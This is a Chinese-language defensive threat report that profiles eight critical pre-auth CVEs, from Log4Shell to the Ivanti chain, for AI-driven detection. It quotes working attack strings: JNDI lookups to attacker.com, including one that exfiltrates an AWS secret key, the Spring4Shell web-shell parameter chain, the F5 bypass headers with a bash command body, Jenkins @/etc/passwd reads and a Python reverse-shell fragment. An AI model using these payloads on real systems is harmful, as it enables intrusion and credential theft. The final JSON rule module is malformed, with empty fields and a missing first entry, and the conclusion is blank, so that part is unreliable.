# 高危險組件的自動化識別與威脅分析報告：針對未經身份驗證的遠端代碼執行與資訊洩露漏洞之深度研究

## 1. 前言：現代網路邊界的防禦崩壞與 AI 檢測的新範式

在當前的網路安全態勢中，防禦邊界的概念已經變得模糊且脆弱。過去依賴防火牆與存取控制列表（ACL）構建的「護城河」模式，在面對應用層漏洞時顯得力不從心。特別是針對關鍵基礎設施與中間件（Middleware）的「未經身份驗證遠端代碼執行」（Unauthenticated Remote Code Execution, Pre-Auth RCE）漏洞，已成為攻擊者進入企業核心網路的首選途徑。這類漏洞允許攻擊者繞過所有的身份驗證機制，直接在伺服器上執行任意指令，其風險等級往往達到 CVSS 評分的最高分 9.0 至 10.0。

本研究報告旨在為人工智慧（AI）驅動的自動化檢測系統提供詳盡的技術藍圖，專注於識別那些具有「高危險性」的組件。所謂高危險組件，在此定義為廣泛部署於企業網路邊界、且存在已知或潛在的 Pre-Auth RCE 或嚴重資訊洩露（Info Leak）漏洞的軟體服務。為了訓練 AI 模型準確識別這些威脅，我們必須超越傳統的特徵碼比對（Signature Matching），轉而深入理解漏洞的觸發邏輯、協議異常特徵（Protocol Anomalies）以及不可否認的確認指標（Absolute Confirmation Indicators）。

本報告將深入剖析八個定義了當代威脅格局的關鍵漏洞案例：Apache Log4j2 (Log4Shell)、Spring Framework (Spring4Shell)、Atlassian Confluence OGNL Injection、Microsoft Exchange ProxyShell、F5 BIG-IP iControl Bypass、Citrix NetScaler Bleed、Jenkins CLI File Read 以及 Ivanti Connect Secure Chain。這些案例並非孤立的事件，而是代表了不同類型的軟體架構缺陷——從反序列化風險、路徑混淆到記憶體邊界檢查失敗。透過對這些漏洞的解構，我們將建立一套名為 function_known_cves 的檢測邏輯模組，賦予 AI 系統在海量流量中精準獵捕高危組件的能力。

## 2. 漏洞分類學與 AI 識別策略

在深入個別 CVE 之前，我們必須先建立一套適用於 AI 識別的分類框架。AI 模型在處理網路流量時，面臨的最大挑戰是如何在保持低誤報率（False Positive Rate）的同時，捕捉到高度變形的攻擊載荷（Payload）。

### 2.1 檢測信號的三層架構

為了實現精準識別，本研究將檢測信號劃分為三個層級，AI 系統應根據這些信號的組合來判定風險等級：

| **信號層級** | **定義** | **範例** | **AI 判定邏輯** |
|----|----|----|----|
| **Tier 3: 概率性觸發 (Probabilistic Triggers)** | 僅表明特定組件或服務的存在，本身不具備惡意，但為攻擊提供了必要條件。 | URL 路徑如 /autodiscover/autodiscover.json 或 /cli；特定的 Header 如 X-F5-Auth-Token。 | 識別目標資產類型，提高關注度，但不觸發告警。 |
| **Tier 2: 確定性載荷 (Deterministic Payloads)** | 包含違反協議規範的語法、已知惡意原語（Primitives）或異常的字符序列。 | \${jndi:ldap:// 字串、異常超長的 Host Header、路徑遍歷序列 ../../。 | 判定為高可信度的攻擊嘗試，應立即觸發攔截或深度分析。 |
| **Tier 1: 絕對確認指標 (Absolute Confirmation Indicators)** | 攻擊成功後的直接反饋，提供了不可否認的妥協證據。 | 伺服器發出的 OAST (Out-of-band) DNS 查詢、HTTP 回應中包含 uid=0(root) 或特定的 Session Token。 | 確認漏洞利用成功，需啟動事件回應（IR）流程。 |

### 2.2 協議層面的異常分析

高危險組件的識別往往依賴於對協議細微差別的理解。例如，F5 的漏洞利用了 HTTP Header 在反向代理轉發時的處理差異；Citrix Bleed 則利用了記憶體處理函數對超長 Header 的錯誤計算。AI 模型需要具備「協議語義理解」能力，而不僅僅是字串匹配。這意味著模型需要理解 HTTP 請求的結構、Header 的依賴關係以及 Body 內容的編碼方式（如 JSON、XML、Binary）。

## 3. 深度剖析：Apache Log4j2 (Log4Shell)

CVE 編號： CVE-2021-44228

風險等級： Critical (CVSS 10.0)

影響範圍： Apache Log4j 2.0-beta9 至 2.14.1

### 3.1 技術根源與架構缺陷

Log4Shell 無疑是過去十年中最具破壞性的漏洞之一，其核心在於日誌庫 Apache Log4j2 提供的一個名為「訊息查找」（Message Lookup）的功能，特別是對 Java 命名與目錄介面（JNDI）的支援。在預設配置下，當 Log4j2 記錄一條包含特定格式字串（如 \${jndi:ldap://...}）的日誌時，它不會將其視為純文本，而是會解析該字串並嘗試執行其中的指令 <sup>1</sup>。

JNDI 是一個 Java API，允許應用程式查找和存取各種命名和目錄服務。該漏洞的關鍵在於 LDAP（輕量級目錄存取協議）向量。攻擊者可以架設一個惡意的 LDAP 伺服器，當受害伺服器的 Log4j2 解析 JNDI 字串並連接到攻擊者的 LDAP 伺服器時，攻擊者可以返回一個惡意的 Java 類別（Class）檔案。受害伺服器會下載並反序列化這個類別，從而觸發靜態初始化代碼塊中的惡意指令，實現遠端代碼執行 <sup>3</sup>。

### 3.2 攻擊向量與觸發路徑分析

Log4Shell 的可怕之處在於其觸發點的泛在性。任何能夠被應用程式記錄下來的輸入點，都可能成為攻擊向量。這對 AI 檢測構成了巨大挑戰，因為攻擊載荷可能隱藏在任何 HTTP 請求的部分中。

- **HTTP Headers:** 這是最常見的攻擊位置。Web 伺服器通常會記錄 User-Agent、Referer 和 X-Forwarded-For 等 Header 以進行流量分析或除錯。攻擊者只需將 Payload 放入這些 Header 中發送請求，即使應用程式本身沒有漏洞，只要底層日誌系統記錄了這些 Header，漏洞就會被觸發 <sup>1</sup>。

- **URL 路徑與參數:** 許多應用程式會記錄請求的 URL 路徑（URI）或查詢參數（Query Parameters）。攻擊者可以構造包含 Payload 的 URL，例如 /search?q=\${jndi:ldap://...}。

- **身份驗證欄位:** 登入表單中的用戶名（Username）是一個極高風險的觸發點。當登入失敗時，系統通常會記錄「用戶嘗試使用用戶名 X 登入失敗」，如果 X 是攻擊 Payload，則日誌記錄操作即觸發攻擊 <sup>1</sup>。

### 3.3 Payload 特徵與混淆技術

AI 模型必須能夠識別 JNDI Lookup 模式及其變體。

- **標準 Payload:** \${jndi:ldap://attacker.com/exploit}

- **協議變體:** 除了 ldap，攻擊者還可能使用 rmi (Remote Method Invocation), dns (僅用於資訊洩露或探測), iiop, 或 ldaps <sup>1</sup>。

- **混淆技術 (Obfuscation):** 為了繞過簡單的 WAF 規則，攻擊者大量使用 Log4j 的嵌套查找功能進行混淆。

  - **大小寫轉換:** \${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://...} —— Log4j 會先解析內部的 \${lower:X} 將其轉換為小寫，最終重組為 jndi:ldap。

  - **預設值技巧:** \${\${::-j}ndi:ldap://...} —— 利用未定義變數的預設值功能。

  - **Unicode/編碼:** 利用 URL 編碼或特定的 Unicode 字符試圖躲避檢測。

### 3.4 絕對確認指標 (Tier 1 Indicators)

對於 Log4Shell，最可靠的確認指標來自於其「回連」（Callback）機制。

- **OAST DNS 回連:** 這是確認漏洞存在但未執行 RCE 的黃金標準。攻擊者發送 \${jndi:dns:// unique-id.interact.sh}。如果 AI 監控系統或防火牆觀察到受害伺服器向 interact.sh 或其他 OAST 平台發起了 DNS 查詢，則可 100% 確認該伺服器解析了惡意 Payload 並易受攻擊 <sup>4</sup>。

- **LDAP/RMI 外連流量:** 如果檢測到伺服器主動向外部不明 IP 的 389 (LDAP), 636 (LDAPS), 或 1099 (RMI) 端口發起 TCP 連接，且該連接的時間點與入站請求中的 JNDI Payload 高度相關，這是漏洞被成功利用的強烈信號 <sup>4</sup>。

- **資訊洩露 Payload:** 攻擊者可利用 \${jndi:ldap://\${env:AWS_SECRET_ACCESS_KEY}.attacker.com} 將環境變數（如 AWS 金鑰）作為子域名發送出去。檢測到 DNS 查詢中包含敏感資訊格式的字串是嚴重的確認指標。

## 4. 深度剖析：Spring Framework (Spring4Shell)

CVE 編號: CVE-2022-22965

風險等級: Critical (CVSS 9.8)

影響範圍: Spring Framework 5.3.0 - 5.3.17, 5.2.0 - 5.2.19, 運行於 JDK 9+

### 4.1 技術根源與架構缺陷

Spring4Shell 漏洞利用了 Spring Framework 的數據綁定（Data Binding）機制中的缺陷。在 Spring MVC 中，DataBinder 負責將 HTTP 請求參數自動綁定到 Java 對象（POJO）。攻擊者可以通過特殊的參數名稱來訪問並修改對象的屬性。

雖然 Spring 試圖通過黑名單機制限制對 class、module 等敏感屬性的訪問，但在 JDK 9 引入模組系統（Jigsaw）後，Class 對象增加了一個 getModule() 方法，這打破了原有的防禦。攻擊者可以通過 class.module.classLoader 路徑繞過限制，獲取到 ClassLoader 對象。在 Tomcat 環境中，這個 ClassLoader 可以被用來修改 AccessLogValve 的配置。攻擊者將日誌檔案的後綴改為 .jsp，並將日誌內容格式修改為惡意代碼，從而在伺服器上寫入一個 Web Shell <sup>5</sup>。

### 4.2 攻擊向量與觸發路徑分析

此漏洞的觸發需要特定的環境條件：JDK 9+、Tomcat 作為 Servlet 容器、部署方式為 WAR 包（非 Spring Boot 可執行 Jar）。

- **觸發 URL:** 任何使用了 Spring MVC 並且接受參數綁定的端點（Endpoint）都可能成為入口。例如登入頁面、搜索功能或表單提交接口。

- **HTTP 方法:** 通常使用 POST 請求，因為需要發送大量的參數來配置日誌屬性，但 GET 請求在某些情況下也是可能的。

- **Content-Type:** 攻擊載荷通常以 application/x-www-form-urlencoded 格式發送 <sup>8</sup>。

### 4.3 Payload 特徵與參數鏈

AI 識別的重點在於檢測請求 Body 中是否包含針對 ClassLoader 的屬性修改鏈。

- **特徵參數鏈:**

  - class.module.classLoader.resources.context.parent.pipeline.first.pattern: 這是最關鍵的參數，其值為要寫入的 Web Shell 代碼。例如：%{c2}i if("j".equals(request.getParameter("pwd"))){...}。這裡利用了 Tomcat 日誌格式化功能，%{xxx}i 表示引用 HTTP Header 的內容，這是一種巧妙的技巧，將實際的 Shell 代碼放在 HTTP Header 中，而 pattern 參數只包含引用，以避免參數過長或特殊字符被過濾 <sup>9</sup>。

  - class.module.classLoader.resources.context.parent.pipeline.first.suffix: 設定為 .jsp，確保生成的檔案被伺服器作為腳本執行。

  - class.module.classLoader.resources.context.parent.pipeline.first.directory: 設定為 webapps/ROOT，確保檔案寫入到網站根目錄下，使其可被外部訪問。

  - class.module.classLoader.resources.context.parent.pipeline.first.prefix: 設定檔案名稱，如 tomcatwar 或 shell <sup>10</sup>。

### 4.4 絕對確認指標 (Tier 1 Indicators)

- **檔案系統變更:** 在 Web 根目錄下突然出現非預期的 .jsp 檔案（如 tomcatwar.jsp），且其內容包含 Java Runtime 執行代碼，是絕對確認指標 <sup>6</sup>。

- **Web Shell 訪問與執行:** 檢測到對新生成的 .jsp 檔案的後續 GET 請求（例如 /tomcatwar.jsp?pwd=j&cmd=whoami），並且伺服器回應了系統命令的執行結果（如 nt authority\system 或 root），這是 RCE 成功的確鑿證據 <sup>11</sup>。

- **日誌配置變更:** 如果監控到 Tomcat 的配置在運行時被修改，特別是涉及 AccessLogValve 的屬性，應視為攻擊進行中。

## 5. 深度剖析：Atlassian Confluence (OGNL Injection)

CVE 編號: CVE-2022-26134

風險等級: Critical (CVSS 9.8)

影響範圍: Confluence Server and Data Center 多個版本

### 5.1 技術根源與架構缺陷

此漏洞源於 Confluence 使用的 WebWork 框架（基於 Struts 2）在處理 HTTP 請求 URL 時存在缺陷。WebWork 會將 URL 中的某些部分解析為 OGNL（Object-Graph Navigation Language）表達式。OGNL 是一種強大的表達式語言，允許獲取和設置 Java 對象的屬性，甚至執行 Java 方法。由於缺乏足夠的過濾，未經身份驗證的攻擊者可以在 URL 中注入惡意 OGNL 表達式，從而調用 java.lang.Runtime.getRuntime().exec() 來執行任意系統命令 <sup>13</sup>。

### 5.2 攻擊向量與觸發路徑分析

攻擊完全發生在 URI 路徑中，不需要特殊的 Header 或 Body 內容，這使得它非常容易被利用，但也相對容易被特徵識別。

- **觸發 URL:** 攻擊者可以將 Payload 附加在任何合法的 Confluence URL 路徑上，或者直接作為路徑的一部分。

- **編碼:** 由於 URL 的限制，OGNL 表達式必須經過 URL 編碼（URL Encoding）。例如，\${ 會被編碼為 %24%7B <sup>15</sup>。

### 5.3 Payload 特徵與 OGNL 語法

AI 模型需要識別 URL 解碼後的 OGNL 語法結構。

- **核心特徵:** 調用 Java Runtime 的模式是識別的關鍵。

  - 原始 Payload: \${@java.lang.Runtime@getRuntime().exec("command")}

  - 編碼後特徵: %24%7B%40java.lang.Runtime%40getRuntime%28%29.exec

- **回顯技巧 (Response Reflection):** 高級的 Payload 不僅執行命令，還會將命令的輸出回顯到 HTTP 回應 Header 中，以便攻擊者立即看到結果，而無需建立反向 Shell。

  - Payload 範例: 使用 com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",...) 來設置一個自定義 Header，其中包含命令執行的輸出 <sup>14</sup>。

### 5.4 絕對確認指標 (Tier 1 Indicators)

- **自定義回應 Header:** 如果在 HTTP 回應中檢測到非標準的 Header（如 X-Qualys-Response、X-Cmd-Response），且其內容疑似為系統命令輸出（如用戶 ID、路徑資訊），這是漏洞利用成功的絕對指標 <sup>14</sup>。

- **進程鏈異常:** 在伺服器端，如果觀察到 Confluence 的 Java 進程（通常是 tomcat 或 confluence 用戶權限）直接衍生出 shell 進程（如 bash, sh, cmd.exe, powershell.exe），且該行為與入站的惡意 URL 請求時間吻合，則確認為 RCE <sup>4</sup>。

## 6. 深度剖析：Microsoft Exchange (ProxyShell)

CVE 編號: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207

風險等級: Critical (Chain)

### 6.1 技術根源與架構缺陷

ProxyShell 並非單一漏洞，而是一條由三個漏洞組成的攻擊鏈，完美展示了現代複雜系統中的邏輯缺陷：

1.  **CVE-2021-34473 (Pre-Auth Path Confusion):** Exchange 的前端（Client Access Service, CAS）與後端在解析 URL 時存在不一致。攻擊者通過構造特殊的 URL /autodiscover/autodiscover.json，讓前端誤以為是訪問不需要驗證的 Autodiscover 服務，但實際上請求被路由到了後端的其他敏感服務（如 PowerShell 或 MAPI），並且後端因為信任前端，將其視為已驗證的 System 用戶請求 <sup>16</sup>。

2.  **CVE-2021-34523 (Privilege Escalation):** 利用上述路徑混淆，攻擊者可以注入 X-Rps-CAT (Client Access Token) Header，將自己提升為 Exchange Admin 權限 <sup>18</sup>。

3.  **CVE-2021-31207 (Post-Auth Arbitrary File Write):** 獲得 Admin 權限後，攻擊者利用 PowerShell 的 New-MailboxExportRequest 命令，將惡意郵件（包含 Web Shell 代碼）導出為 .aspx 檔案到 Web 目錄，實現 RCE <sup>18</sup>。

### 6.2 攻擊向量與觸發路徑分析

攻擊主要針對 HTTPS 端口（443）。

- **觸發 URL:** /autodiscover/autodiscover.json 是核心特徵。

- **路徑混淆模式:** URL 通常呈現為 /autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com。這裡 @evil.com 並非真實域名，而是用來欺騙解析器的雜訊，重點在於後面的 /mapi/nspi 或 /powershell，這才是真正被訪問的後端服務 <sup>18</sup>。

### 6.3 Payload 特徵與利用階段

- **Email 參數:** 攻擊者會在 URL 的 Email 參數或 Cookie 中注入目標後端地址。

- **PST 導出:** 最終的 RCE Payload 是一段 PowerShell 指令，指示 Exchange 將郵件導出為 PST 檔案，但檔案擴展名被指定為 .aspx。

  - 指令特徵: New-MailboxExportRequest -Mailbox... -FilePath "\\127.0.0.1\c\$\inetpub\wwwroot\aspnet_client\shell.aspx" <sup>20</sup>。

### 6.4 絕對確認指標 (Tier 1 Indicators)

- **Web 目錄中的 ASPX 檔案:** 在 Exchange 的非標準目錄（如 /aspnet_client/、/owa/auth/）下發現新生成的 .aspx 檔案，且內容包含一句話木馬，是絕對確認指標。

- **PowerShell 日誌:** Windows 事件日誌中出現 New-MailboxExportRequest 的調用，且 FilePath 指向 Web 目錄而非標準的備份目錄。

- **後端服務的未授權訪問:** 監控日誌中出現對 /mapi/nspi 或 /powershell 的請求，其來源 IP 為外部 IP，但身份驗證狀態顯示為 System 或 Admin，且 URL 包含 Autodiscover 混淆特徵 <sup>21</sup>。

## 7. 深度剖析：F5 BIG-IP (iControl REST Auth Bypass)

CVE 編號: CVE-2022-1388

風險等級: Critical (CVSS 9.8)

影響範圍: F5 BIG-IP 多個版本

### 7.1 技術根源與架構缺陷

此漏洞是一個經典的 HTTP 請求走私（Request Smuggling）或 Hop-by-Hop Header 濫用案例。F5 BIG-IP 的管理介面使用 Apache 作為反向代理，後端連接 Jetty 服務。通常，Apache 會驗證 X-F5-Auth-Token。然而，攻擊者可以在請求中加入 Connection: X-F5-Auth-Token Header。根據 HTTP 規範，代理伺服器（Apache）在轉發請求前應刪除 Connection Header 中列出的 Header。因此，Apache 刪除了 X-F5-Auth-Token，但未阻止請求。後端 Jetty 收到請求後，發現沒有 Token，但由於配置缺陷（默認信任本地請求或特定 Header 缺失時的行為），允許了該請求以管理員權限執行 <sup>22</sup>。

### 7.2 攻擊向量與觸發路徑分析

攻擊針對管理介面（Management Interface），通常在管理端口上。

- **觸發 URL:** /mgmt/tm/util/bash。這是 F5 提供的用於執行系統 Bash 命令的 REST API 端點，本應受到嚴格保護 <sup>22</sup>。

### 7.3 Payload 特徵與 Header 組合

這個漏洞的識別特徵非常具體，依賴於一組特定的 Header 組合：

1.  **Authorization:** Basic YWRtaW46 (Base64 解碼為 admin:)，即使沒有密碼，後端也可能因為繞過了驗證邏輯而接受。

2.  **X-F5-Auth-Token:** 任意值（例如 anything）。

3.  **Connection:** X-F5-Auth-Token。這是最關鍵的特徵，指示 Apache 移除 Token Header <sup>22</sup>。

4.  **Host:** localhost 或 127.0.0.1。用於欺騙後端相信請求來自本地。

**Body Payload (JSON):**

> JSON

{  
"command": "run",  
"utilCmdArgs": "-c id"  
}

這個 JSON 結構指示系統執行 id 命令 <sup>22</sup>。

### 7.4 絕對確認指標 (Tier 1 Indicators)

- **命令執行回應:** HTTP 200 OK 回應，且 JSON Body 中包含 commandResult 欄位，其值為 uid=0(root) gid=0(root)。這是系統以 Root 權限執行命令的直接證據 <sup>24</sup>。

- **流量特徵組合:** 在外部流量中同時檢測到 Connection: X-F5-Auth-Token 和指向敏感 API 端點（如 /mgmt/tm/util/bash）的請求，幾乎可以判定為攻擊嘗試。

## 8. 深度剖析：Citrix NetScaler (Citrix Bleed)

CVE 編號: CVE-2023-4966

風險等級: Critical (CVSS 9.4)

影響範圍: NetScaler ADC 和 NetScaler Gateway

### 8.1 技術根源與架構缺陷

Citrix Bleed 是一個緩衝區越界讀取（Buffer Over-read）漏洞，而非傳統的 RCE，但其危害極大，可導致會話劫持。漏洞位於 OpenID Connect Discovery 端點的處理邏輯中。當系統生成回應時，會使用 snprintf 將 Host Header 的內容插入到 JSON Payload 中。由於未正確檢查返回值，當 Host Header 過長時，系統會錯誤地計算回應長度，導致將緩衝區之後的記憶體內容一併發送給客戶端。這些洩露的記憶體中通常包含其他用戶的有效 Session Token（NSC_AAAC Cookie）<sup>25</sup>。

### 8.2 攻擊向量與觸發路徑分析

- **觸發 URL:** /oauth/idp/.well-known/openid-configuration <sup>26</sup>。

- **HTTP 方法:** GET。

### 8.3 Payload 特徵與 Host Header

攻擊載荷主要體現在 Host Header 的長度上。

- **超長 Host Header:** 攻擊者發送的 Host Header 包含大量重複字符（例如 a 重複 24,812 次）。這個長度經過精心計算，旨在剛好溢出緩衝區邊界並讀取到敏感記憶體區域 <sup>26</sup>。

- **異常流量特徵:** 正常的 Host Header 長度通常在幾十個字節，數萬字節的 Host Header 是極度異常的。

### 8.4 絕對確認指標 (Tier 1 Indicators)

- **回應大小異常:** 正常的 OpenID 配置回應應該是固定的 JSON 格式，大小有限。如果回應體積顯著大於正常值，且包含大量非 JSON 的二進制數據或亂碼，則表明記憶體洩露發生。

- **洩露的 Session Token:** 在回應的二進制數據中，如果發現形如 NSC_AAAC 後跟隨 32 或 65 字節十六進制字串的模式，這是會話 Token 被洩露的絕對證據。攻擊者可利用此 Token 直接接管用戶會話，繞過 MFA <sup>26</sup>。

## 9. 深度剖析：Jenkins CLI (Arbitrary File Read)

CVE 編號: CVE-2024-23897

風險等級: Critical (CVSS 9.8)

影響範圍: Jenkins 2.441 及更早版本

### 9.1 技術根源與架構缺陷

Jenkins 的命令行介面（CLI）使用 args4j 庫來解析參數。該庫有一個預設啟用的功能 expandAtFiles，即當參數以 @ 開頭時，它會將其視為檔案路徑，讀取該檔案的內容並將其作為參數值。由於 Jenkins CLI 可以通過 HTTP POST 請求訪問，未經身份驗證的攻擊者可以利用此功能讀取 Jenkins 控制器上的任意檔案（如 /etc/passwd 或加密金鑰）<sup>28</sup>。

### 9.2 攻擊向量與觸發路徑分析

- **觸發 URL:** /cli?remoting=false。這是 Jenkins CLI 的 HTTP 入口點。

- **協議:** Jenkins 使用自定義的二進制序列化協議通過 HTTP 傳輸。

### 9.3 Payload 特徵與二進制結構

Payload 是 HTTP POST 的 Body 部分，包含二進制數據。

- **指令:** 通常使用 connect-node 或 help 指令，因為這些指令會將參數內容回顯在錯誤訊息中。

- **參數注入:** Payload 中包含 @/etc/passwd 或 @/var/jenkins_home/secrets/master.key 的字串。

- **二進制特徵:** 請求 Body 中會包含指令長度、指令字串、參數個數、參數長度等二進制結構。例如：\x00\x00\x00\x06...help...\x00\x00\x0c@/etc/passwd <sup>30</sup>。

### 9.4 絕對確認指標 (Tier 1 Indicators)

- **錯誤訊息洩露檔案內容:** HTTP 回應雖然狀態碼可能是 200，但內容是 Jenkins 的序列化回應。如果解析回應發現包含目標檔案的內容（如 /etc/passwd 的 root:x:0:0:...），則確認漏洞利用成功 <sup>28</sup>。

- **異常報錯:** 當攻擊者嘗試讀取不存在的檔案以探測時，伺服器返回的 No such file 異常也是一種識別指標。

## 10. 深度剖析：Ivanti Connect Secure (Auth Bypass & RCE Chain)

CVE 編號: CVE-2023-46805 & CVE-2024-21887

風險等級: Critical (Chain CVSS 9.1)

影響範圍: Ivanti Connect Secure (ICS) 9.x, 22.x

### 10.1 技術根源與架構缺陷

這是一套組合拳：

1.  **CVE-2023-46805 (Auth Bypass):** 系統在處理 URL 時存在路徑遍歷漏洞。攻擊者可以通過 /api/v1/totp/user-backup-code/../../ 這樣的路徑繞過身份驗證檢查，訪問本應受保護的系統 API <sup>31</sup>。

2.  **CVE-2024-21887 (Command Injection):** 在繞過驗證後，攻擊者訪問 /api/v1/license/keys-status 等端點，這些端點的參數處理存在命令注入漏洞，允許攻擊者以 Root 權限執行系統命令 <sup>31</sup>。

### 10.2 攻擊向量與觸發路徑分析

- **觸發 URL:** 包含路徑遍歷序列的 API 請求，如 /api/v1/totp/user-backup-code/../../system/system-information。

- **目標端點:** /api/v1/license/keys-status 是常見的 RCE 觸發點。

### 10.3 Payload 特徵

- **繞過特徵:** URL 中包含 /totp/user-backup-code/../../ 是最明顯的特徵。

- **RCE Payload:** 在 JSON Body 或參數中注入 Shell 命令。

  - 範例: "; python -c 'import socket...os.dup2.../bin/sh'" —— 利用 Python 反彈 Shell <sup>31</sup>。

### 10.4 絕對確認指標 (Tier 1 Indicators)

- **未授權的系統資訊洩露:** 訪問 /system/system-information 端點且未提供 Session Cookie，卻成功返回包含 serial-number、hardware-model 的 JSON 數據，確認身份驗證已被繞過 <sup>31</sup>。

- **OAST 回連:** RCE Payload 執行後，受害設備主動向攻擊者 IP 發起連接。

## 11. 比較分析與 AI 檢測矩陣

為了協助 AI 模型區分這些漏洞，我們構建了以下的特徵對照表：

| **組件漏洞 (CVE)** | **觸發位置** | **核心特徵 (Signature)** | **協議層面異常** | **確認指標 (Confirmation)** |
|----|----|----|----|----|
| **Log4Shell** | Headers, URI, Body | \${jndi:ldap://...} | 出站 LDAP/RMI 連接 | OAST DNS 解析 |
| **Spring4Shell** | POST Body | class.module.classLoader... | 修改 Tomcat 日誌配置 | Web Root 下生成.jsp 檔案 |
| **Confluence OGNL** | URI Path | \${@java.lang.Runtime...} | URL 編碼的 Java 調用 | 回應 Header 含命令輸出 |
| **ProxyShell** | URI Path | /autodiscover/autodiscover.json | 前後端路徑解析不一致 | 導出.aspx 檔案 |
| **F5 iControl** | Headers | Connection: X-F5-Auth-Token | Hop-by-Hop Header 濫用 | JSON 回應含 uid=0 |
| **Citrix Bleed** | Host Header | 超長 Host Header (\>20KB) | Host Header 長度溢出 | 回應含 NSC_AAAC Token |
| **Jenkins CLI** | POST Body (Binary) | @/etc/passwd | CLI 二進制協議異常 | 錯誤訊息洩露檔案內容 |
| **Ivanti Chain** | URI Path | /totp/user-backup-code/../../ | API 路徑遍歷 | 未授權返回系統資訊 |

## 12. function_known_cves 模組規範 (JSON Output)

以下 JSON 結構是本報告的核心產出，專為 AI 檢測系統設計。它將上述的人類可讀分析轉化為機器可執行的邏輯規則。

> JSON

{  
"function_known_cves":,  
"payload_signatures": \[  
"\\\$\\{jndi:(ldap\|rmi\|dns\|iiop\|ldaps):\\/\\/\[^\\}\]+\\}",  
"\\\$\\{\\\$\\{lower:j\\}ndi:",  
"\\\$\\{lower:l\\}\\{lower:d\\}a\\{lower:p\\}",  
"\\\$\\{::\\-j\\}ndi"  
\],  
"confirmation_indicators": {  
"network_outbound": "主動向外部 IP 的 389, 636, 1099, 1389 端口發起連接",  
"oast_dns": "對 Payload 中指定的域名（如 interact.sh）發起 DNS 查詢",  
"response_behavior": "不適用 (Blind RCE，通常無直接 HTTP 回應特徵)"  
},  
"detection_logic": "檢測任何輸入點是否包含 JNDI 協議頭，並結合混淆解碼邏輯。確認指標依賴於出站流量關聯。"  
},  
{  
"cve_id": "CVE-2022-22965",  
"name": "Spring4Shell",  
"vulnerability_type": "ClassLoader Manipulation / Unauthenticated RCE",  
"trigger_vectors":,  
"payload_signatures": \[  
"class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.pattern=",  
"class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.suffix=\\.jsp",  
"class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.directory=",  
"class\\.module\\.classLoader\\.resources\\.context\\.parent\\.pipeline\\.first\\.prefix="  
\],  
"confirmation_indicators": {  
"filesystem": "Web Root 目錄下創建新的.jsp 檔案 (如 tomcatwar.jsp)",  
"http_response": "訪問新創建的.jsp 檔案返回 HTTP 200 且內容為命令執行結果",  
"log_anomaly": "AccessLogValve 配置被動態修改"  
},  
"detection_logic": "監控 HTTP POST 請求中是否包含針對 classLoader 的特定屬性修改鏈。確認指標為新檔案生成及訪問。"  
},  
{  
"cve_id": "CVE-2022-26134",  
"name": "Atlassian Confluence OGNL Injection",  
"vulnerability_type": "OGNL Injection / Unauthenticated RCE",  
"trigger_vectors":,  
"payload_signatures":,  
"confirmation_indicators": {  
"response_header": "HTTP 回應中出現自定義 Header (如 X-Qualys-Response, X-Cmd-Response) 且包含系統資訊",  
"process_creation": "Java 進程衍生 Shell 子進程"  
},  
"detection_logic": "解析 URI 路徑中的 URL 編碼內容，尋找 OGNL 語法及 Runtime 調用。確認指標為回應 Header 中的回顯。"  
},  
{  
"cve_id": "CVE-2021-34473",  
"name": "Microsoft Exchange ProxyShell",  
"vulnerability_type": "Path Confusion / SSRF / Unauthenticated RCE Chain",  
"trigger_vectors":,  
"payload_signatures":,  
"confirmation_indicators": {  
"http_response": "對後端端點 (/mapi/nspi, /powershell) 的請求返回 HTTP 200 OK，且源自 Autodiscover 路徑",  
"filesystem": "Exchange Web 目錄 (/aspnet_client/) 下出現.aspx 檔案",  
"log_audit": "PowerShell 日誌顯示 New-MailboxExportRequest 操作"  
},  
"detection_logic": "識別 URI 中的 Autodiscover 路徑混淆模式。確認指標為繞過驗證訪問後端服務。"  
},  
{  
"cve_id": "CVE-2022-1388",  
"name": "F5 BIG-IP iControl REST Auth Bypass",  
"vulnerability_type": "Authentication Bypass / RCE",  
"trigger_vectors":,  
"payload_signatures":,  
"confirmation_indicators": {  
"response_body": "JSON 回應包含 'commandResult' 字段且值為 'uid=0(root)'",  
"status_code": "對管理端點的未授權請求返回 HTTP 200 OK"  
},  
"detection_logic": "檢測 Connection Header 是否包含 X-F5-Auth-Token，並檢查目標 URI 是否為管理 API。確認指標為命令執行回顯。"  
},  
{  
"cve_id": "CVE-2023-4966",  
"name": "Citrix NetScaler Bleed",  
"vulnerability_type": "Buffer Over-read / Info Leak",  
"trigger_vectors":,  
"payload_signatures":,  
"confirmation_indicators": {  
"response_content": "回應 Body 包含二進制記憶體轉儲數據",  
"pattern_match": "回應中包含 'NSC_AAAC=' 跟隨 32-65 字節十六進制 Session Token"  
},  
"detection_logic": "監控針對 OpenID 配置端點的 Host Header 長度。確認指標為回應中洩露的 NSC_AAAC Token。"  
},  
{  
"cve_id": "CVE-2024-23897",  
"name": "Jenkins CLI Arbitrary File Read",  
"vulnerability_type": "Argument Injection / File Read",  
"trigger_vectors":,  
"payload_signatures": \[  
"Opcode: connect-node",  
"Argument: @\\/etc\\/passwd",  
"Argument: @\\/var\\/jenkins_home\\/secrets\\/master.key"  
\],  
"confirmation_indicators": {  
"response_body": "錯誤訊息中洩露檔案內容 (如 'root:x:0:0' 或二進制金鑰數據)",  
"response_type": "Jenkins CLI 二進制流包含異常 Exception"  
},  
"detection_logic": "解析 Jenkins CLI 二進制協議，檢測以 '@' 開頭的參數。確認指標為回應中的檔案內容。"  
},  
{  
"cve_id": "CVE-2023-46805",  
"name": "Ivanti Connect Secure Chain",  
"vulnerability_type": "Path Traversal / Auth Bypass / RCE",  
"trigger_vectors":,  
"payload_signatures": \[  
"\\/api\\/v1\\/totp\\/user-backup-code\\/\\.\\.\\/",  
"\\/api\\/v1\\/license\\/keys-status\\/\\.\\.\\/",  
"python -c 'import socket"  
\],  
"confirmation_indicators": {  
"response_body": "未授權請求返回包含 'system-information' (hostname, serial-number) 的 JSON",  
"network_outbound": "伺服器發起反向 Shell 連接"  
},  
"detection_logic": "檢測 API 路徑中的目錄遍歷序列。確認指標為敏感系統資訊的未授權訪問。"  
}  
\]  
}

## 13. 結論與未來展望

